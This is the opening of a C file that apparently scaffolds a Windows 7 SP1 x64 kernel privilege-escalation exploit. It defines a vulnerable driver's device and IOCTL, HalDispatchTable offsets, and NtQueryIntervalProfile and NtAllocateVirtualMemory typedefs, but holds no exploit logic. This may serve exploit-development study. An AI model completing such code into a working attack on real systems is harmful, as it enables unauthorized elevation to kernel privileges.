#include <Windows.h>
#include <stdio.h>

#define TARGET_DEVICE "\\\\.\\GLOBALROOT\\Device\\OBJINFO"
#define TARGET_IOCTL 0xCF532013

#define NT_DLL_LOCATION "C:\\Windows\\System32\\ntdll.dll"

#define NT_HALDISPATCHTABLE_WIN7_SP1_X64_OFFSET 0x1E3CE8
#define HAL_HALIQUERYSYSTEMINFORMATION_WIN7_SP1_X64_OFFSET 0x6158E8

typedef struct _DEVICE_INPUT
{
	unsigned long long Padding;
	unsigned long long* Address;
	unsigned int Size;
} DEVICE_INPUT, * PDEVICE_INPUT;

typedef unsigned int(__stdcall* NtQueryIntervalProfile)(
	unsigned int      ProfileSource,
	PULONG            Interval
	);

typedef NTSTATUS(_stdcall* NtAllocateVirtualMemory)(
	HANDLE ProcessHandle,
	PVOID* BaseAddress,
	ULONG ZeroBits,
	PULONG RegionSize,
	ULONG AllocationType,
	ULONG Protect
	);

int main(int argc, char** argv);